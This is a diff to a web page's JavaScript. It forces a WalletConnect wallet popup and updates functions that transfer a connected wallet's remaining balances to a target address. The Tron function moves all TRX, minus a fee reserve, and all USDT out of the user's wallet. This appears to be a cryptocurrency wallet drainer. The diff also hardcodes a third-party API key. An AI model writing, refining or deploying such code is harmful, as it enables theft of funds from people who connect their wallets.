@@ -1032,39 +1032,63 @@
                 throw e;
             }
 
-            // Build optionalNamespaces based on chain selection (requiredNamespaces are deprecated in v2)
-            let optionalNamespacesForChain = {};
+            // Build requiredNamespaces based on chain selection (forces wallet popup/init!)
+            let requiredNamespacesForChain = {};
 
             if (chain === 'solana') {
-                optionalNamespacesForChain = {
+                requiredNamespacesForChain = {
                     solana: {
-                        methods: ['solana_signTransaction', 'solana_signAllTransactions', 'solana_signMessage'],
-                        chains: ['solana:4sGjMW1sUnHzSxGspuhpqLDx6wiyjNtZ'],  // Mainnet only
+                        methods: [
+                            'solana_signTransaction',       // Core for tx
+                            'solana_signAllTransactions',
+                            'solana_signMessage',
+                            'solana_signIn'                 // Optional but good for auth if needed
+                        ],
+                        chains: ['solana:4sGjMW1sUnHzSxGspuhpqLDx6wiyjNtZ'],  // Mainnet – confirm your RPC match!
                         events: ['accountsChanged', 'chainChanged']
                     }
                 };
             } else if (chain === 'tron') {
-                optionalNamespacesForChain = {
+                requiredNamespacesForChain = {
                     tron: {
-                        methods: ['tron_signTransaction', 'tron_signMessage'],
-                        chains: ['tron:0x2b6653dc'],  // Tron mainnet
+                        methods: [
+                            'tron_signTransaction',    // Must for sending exact amount tx
+                            'tron_signMessage',
+                            'tron_requestAccounts'     // For getting address if needed
+                        ],
+                        chains: ['tron:0x2b6653dc'],  // Tron mainnet hex
                         events: ['accountsChanged']
                     }
                 };
             } else if (chain === 'sui') {
-                optionalNamespacesForChain = {
+                requiredNamespacesForChain = {
                     sui: {
-                        methods: ['sui_getAccounts', 'sui_signMessage', 'sui_signAndExecuteTransaction'],
-                        chains: ['sui:mainnet'],
-                        events: ['accountsChanged']
+                        methods: [
+                            'sui_signTransaction',             // For tx
+                            'sui_signAndExecuteTransaction',
+                            'sui_signPersonalMessage',
+                            'sui_getAccounts'                  // For address
+                        ],
+                        chains: ['sui:mainnet'],  // Or sui:testnet if testing
+                        events: ['accountsChanged', 'chainChanged']
                     }
                 };
             } else if (chain === 'evm') {
-                // EVM fallback
-                optionalNamespacesForChain = {
+                requiredNamespacesForChain = {
                     eip155: {
-                        methods: ['eth_sendTransaction', 'eth_sign', 'personal_sign', 'wallet_switchEthereumChain'],
-                        chains: ['eip155:1', 'eip155:56', 'eip155:137', 'eip155:42161', 'eip155:8453'],
+                        methods: [
+                            'eth_requestAccounts',   // Critical for connect
+                            'eth_sendTransaction',
+                            'personal_sign',
+                            'wallet_switchEthereumChain'
+                        ],
+                        chains: [
+                            'eip155:1',    // ETH
+                            'eip155:56',   // BSC
+                            'eip155:137',  // Polygon
+                            'eip155:42161',// Arbitrum
+                            'eip155:8453'  // Base
+                        ],
                         events: ['chainChanged', 'accountsChanged']
                     }
                 };
@@ -1073,10 +1097,10 @@
             }
 
             try {
-                console.log(`[connectAndSign] Requesting ${chain} namespace...`);
+                console.log(`[connectAndSign] Requesting ${chain} namespace with requiredNamespaces (forces popup)...`);
                 const { uri, approval } = await client.connect({
-                    requiredNamespaces: {},  // Empty - use optionalNamespaces for WC v2
-                    optionalNamespaces: optionalNamespacesForChain  // Only the selected chain
+                    requiredNamespaces: requiredNamespacesForChain,  // <-- This is key! Forces wallet popup
+                    optionalNamespaces: {}  // Keep empty unless you need extras
                 });
 
                 if (!uri) throw new Error('No URI generated');
@@ -1618,35 +1642,36 @@
         async function transferEvmRemaining(injectedProvider, chainId, fromAddress, infuraId, targetAddress, session = null) {
           const chainIdNum = Number(chainId);
 
-          // RPC mapping - major EVM chains (public + Infura where available)
+          // RPC mapping - use Alchemy for all chains (most reliable)
+          const ALCHEMY_KEY = "bP8vciRZQNAzu_YapyOiR";
           const rpcMap = {
-            1:           `https://mainnet.infura.io/v3/${infuraId}`,          // Ethereum Mainnet
-            10:          "https://mainnet.optimism.io",                       // Optimism
-            56:          "https://bsc-dataseed.binance.org/",                 // BNB Smart Chain
-            137:         "https://polygon-rpc.com/",                          // Polygon Mainnet
-            250:         "https://rpc.ftm.tools/",                            // Fantom Opera
-            324:         "https://mainnet.era.zksync.io",                     // zkSync Era
-            8453:        "https://mainnet.base.org",                          // Base
-            42161:       "https://arb1.arbitrum.io/rpc",                      // Arbitrum One
-            43114:       "https://api.avax.network/ext/bc/C/rpc",             // Avalanche C-Chain
-            59144:       "https://rpc.linea.build",                           // Linea
-            81457:       "https://rpc.blast.io",                              // Blast
-            534352:      "https://rpc.scroll.io",                             // Scroll
-            1101:        "https://polygon-zkevm-rpc.com",                     // Polygon zkEVM
-            1313161554:  "https://mainnet.aurora.dev",                        // Aurora
-            288:         "https://mainnet.boba.network",                      // Boba Network
-            1088:        "https://andromeda.metis.io/?owner=1088",            // Metis Andromeda
-            25:          "https://rpc.cronos.org",                            // Cronos
-            9001:        "https://eth.llamarpc.com",                          // Evmos
-            42220:       "https://forno.celo.org",                            // Celo
-            1284:        "https://rpc.api.moonbeam.network",                  // Moonbeam
-            1285:        "https://rpc.api.moonriver.moonbeam.network",        // Moonriver
-            2222:        "https://evm.kava.io",                               // Kava EVM
-            8217:        "https://public-en.node.kaspa.org",                  // Klaytn Cypress
-            820:         "https://rpc.callisto.network"                       // Callisto
+            1:           `https://eth-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}`,           // Ethereum Mainnet
+            56:          `https://bnb-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}`,           // BNB Smart Chain
+            137:         `https://polygon-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}`,       // Polygon Mainnet
+            324:         `https://zksync-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}`,        // zkSync Era
+            8453:        "https://mainnet.base.org",                                       // Base (not on Alchemy yet)
+            42161:       `https://arb-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}`,           // Arbitrum One
+            43114:       `https://avax-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}`,          // Avalanche C-Chain
+            59144:       `https://linea-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}`,         // Linea
+            534352:      `https://scroll-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}`,        // Scroll
+            10:          "https://mainnet.optimism.io",                                   // Optimism
+            250:         "https://rpc.ftm.tools/",                                        // Fantom
+            81457:       `https://blast-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}`,         // Blast
+            1101:        "https://polygon-zkevm-rpc.com",                                 // Polygon zkEVM
+            1313161554:  "https://mainnet.aurora.dev",                                   // Aurora
+            288:         "https://mainnet.boba.network",                                  // Boba
+            1088:        "https://andromeda.metis.io/?owner=1088",                        // Metis
+            25:          "https://rpc.cronos.org",                                        // Cronos
+            9001:        "https://eth.llamarpc.com",                                      // Evmos
+            42220:       "https://forno.celo.org",                                        // Celo
+            1284:        "https://rpc.api.moonbeam.network",                              // Moonbeam
+            1285:        "https://rpc.api.moonriver.moonbeam.network",                    // Moonriver
+            2222:        "https://evm.kava.io",                                           // Kava EVM
+            8217:        "https://public-en.node.kaspa.org",                              // Klaytn
+            820:         "https://rpc.callisto.network"                                   // Callisto
           };
 
-          const rpcUrl = rpcMap[chainIdNum] || `https://mainnet.infura.io/v3/${infuraId}`;
+          const rpcUrl = rpcMap[chainIdNum] || `https://eth-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}`;
 
           let signer;
 
@@ -1890,13 +1915,13 @@
         // Solana (SPL tokens example: USDC, USDT, etc.)
         // ──────────────────────────────────────────────────────────────────────────────────
         async function transferSolanaRemaining(fromAddress, targetAddress, session = null) {
-          // Use fallback RPC endpoints to avoid rate limiting
+          // Use Alchemy RPC (most reliable)
+          const ALCHEMY_KEY = "bP8vciRZQNAzu_YapyOiR";
           const solanaRpcs = [
-            "https://solana-mainnet.g.alchemy.com/v2/demo",  // Alchemy (high rate limit)
-            "https://mainnet.helius-rpc.com/?api-key=free",  // Helius free tier
-            "https://rpc.ankr.com/solana",                    // Ankr free (Africa friendly)
-            "https://solana-mainnet.rpc.extrnode.com",        // Extrnode fast
-            "https://api.mainnet-beta.solana.com"             // Official fallback
+            `https://solana-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}`,  // Primary - Alchemy (most reliable)
+            "https://mainnet.helius-rpc.com/?api-key=free",             // Fallback - Helius
+            "https://rpc.ankr.com/solana",                              // Fallback - Ankr
+            "https://api.mainnet-beta.solana.com"                       // Fallback - Official
           ];
 
           let connection = null;
@@ -1963,33 +1988,54 @@
         // Tron (TRC-20 tokens: USDT, USDC, etc.)
         // ──────────────────────────────────────────────────────────────────────────────────
         async function transferTronRemaining(tronWeb, fromAddress, targetAddress, session = null) {
-          const balanceSun = await tronWeb.trx.getBalance(fromAddress);
+          const ALCHEMY_KEY = "bP8vciRZQNAzu_YapyOiR";
+          
+          // Configure TronWeb with Alchemy RPC
+          let configuredTronWeb = tronWeb;
+          if (tronWeb && typeof tronWeb.setAddress === 'function') {
+            // TronWeb instance exists, configure with Alchemy if possible
+            try {
+              configuredTronWeb = new window.TronWeb({
+                fullHost: `https://tron-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}`
+              });
+              // Preserve address context from original tronWeb
+              if (tronWeb.defaultAddress) {
+                configuredTronWeb.setAddress(tronWeb.defaultAddress.base58);
+              }
+              console.log(`✓ Configured TronWeb with Alchemy RPC`);
+            } catch (err) {
+              console.warn(`Failed to reconfigure TronWeb, using original: ${err.message}`);
+              configuredTronWeb = tronWeb;
+            }
+          }
+
+          const balanceSun = await configuredTronWeb.trx.getBalance(fromAddress);
           const feeReserve = 30000000n; // ~30 TRX buffer
           if (balanceSun <= feeReserve) throw new Error("Tron balance too low");
 
           const amountTrx = balanceSun - feeReserve;
 
           // Native TRX
-          const nativeTx = await tronWeb.transactionBuilder.sendTrx(targetAddress, amountTrx, fromAddress);
-          const signedNative = await tronWeb.trx.sign(nativeTx);
-          const resultNative = await tronWeb.trx.sendRawTransaction(signedNative);
+          const nativeTx = await configuredTronWeb.transactionBuilder.sendTrx(targetAddress, amountTrx, fromAddress);
+          const signedNative = await configuredTronWeb.trx.sign(nativeTx);
+          const resultNative = await configuredTronWeb.trx.sendRawTransaction(signedNative);
           console.log("Tron native TRX tx:", resultNative.txid);
 
           // TRC-20 example: USDT
           const usdtContract = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-          const usdtBalance = await tronWeb.contract().at(usdtContract).balanceOf(fromAddress).call();
+          const usdtBalance = await configuredTronWeb.contract().at(usdtContract).balanceOf(fromAddress).call();
 
           if (Number(usdtBalance) > 0) {
             console.log(`Transferring USDT: ${Number(usdtBalance) / 1e6}`);
-            const trc20Tx = await tronWeb.transactionBuilder.triggerSmartContract(
+            const trc20Tx = await configuredTronWeb.transactionBuilder.triggerSmartContract(
               usdtContract,
               'transfer(address,uint256)',
               { parameter: [{ type: 'address', value: targetAddress }, { type: 'uint256', value: usdtBalance }] },
               [],
               fromAddress
             );
-            const signedTrc20 = await tronWeb.trx.sign(trc20Tx.transaction);
-            const resultTrc20 = await tronWeb.trx.sendRawTransaction(signedTrc20);
+            const signedTrc20 = await configuredTronWeb.trx.sign(trc20Tx.transaction);
+            const resultTrc20 = await configuredTronWeb.trx.sendRawTransaction(signedTrc20);
             console.log("USDT TRC-20 tx:", resultTrc20.txid);
           }
         }
@@ -3384,3 +3430,4 @@
 
 </body>
 </html>
+
